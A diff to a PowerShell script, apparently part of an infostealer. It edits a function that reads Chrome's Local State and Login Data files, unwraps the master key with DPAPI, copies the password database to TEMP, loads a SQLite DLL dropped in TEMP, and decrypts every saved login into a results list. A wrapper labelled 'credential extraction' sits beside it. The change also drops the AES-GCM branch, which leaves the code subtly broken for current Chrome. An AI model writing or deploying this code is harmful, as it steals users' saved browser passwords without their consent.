@@ -392,7 +392,13 @@ function PortSuggest {
 
 
     
-    function Get-DecryptedChromeCreds {
+   function Get-DecryptedChromeCreds {
+    try {
+        Add-Type -AssemblyName System.Security
+    } catch {
+        return "[ERROR] Не удалось загрузить System.Security: $($_.Exception.Message)"
+    }
+
     $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
     $loginDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
 
@@ -403,14 +409,16 @@ function PortSuggest {
     $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
     $encryptedKey = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key)
     $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
-
     $dpapiKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 
     $tempDb = "$env:TEMP\LoginData.db"
     Copy-Item $loginDataPath -Destination $tempDb -Force
 
-    Add-Type -AssemblyName System.Data.SQLite
-    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Version=3;")
+    try {
+        Add-Type -Path "$env:TEMP\System.Data.SQLite.dll"
+    } catch {}
+
+    $conn = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList "Data Source=$tempDb;Version=3;"
     $conn.Open()
     $cmd = $conn.CreateCommand()
     $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
@@ -424,29 +432,14 @@ function PortSuggest {
         $encBytes = New-Object byte[] $encPass.Length
         $encPass.Read($encBytes, 0, $encBytes.Length) | Out-Null
 
-        if ($encBytes[0..2] -join '' -eq 'v10') {
-            $encPwd = $encBytes[3..($encBytes.Length - 1)]
-            try {
-                $aes = [System.Security.Cryptography.AesGcm]::new($dpapiKey)
-                $nonce = $encPwd[0..11]
-                $cipher = $encPwd[12..($encPwd.Length - 17)]
-                $tag = $encPwd[($encPwd.Length - 16)..($encPwd.Length - 1)]
-                $plainBytes = New-Object byte[] $cipher.Length
-                $aes.Decrypt($nonce, $cipher, $tag, $plainBytes)
-                $plain = [System.Text.Encoding]::UTF8.GetString($plainBytes)
-                $results += "$url,$username,$plain"
-            } catch {
-                $results += "$url,$username,[DECRYPTION FAILED]"
-            }
-        } else {
-            try {
-                $plainText = [System.Security.Cryptography.ProtectedData]::Unprotect($encBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-                $results += "$url,$username,$([System.Text.Encoding]::UTF8.GetString($plainText))"
-            } catch {
-                $results += "$url,$username,[DPAPI DECRYPTION FAILED]"
-            }
+        try {
+            $plainText = [System.Security.Cryptography.ProtectedData]::Unprotect($encBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+            $results += "$url,$username,$([System.Text.Encoding]::UTF8.GetString($plainText))"
+        } catch {
+            $results += "$url,$username,[DECRYPTION FAILED]"
         }
     }
+
     $reader.Close()
     $conn.Close()
     Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
@@ -474,6 +467,7 @@ function Get-Credentials {
         return "[ERROR] Credential extraction failed: $($_.Exception.Message)"
     }
 }
+
 
 
 
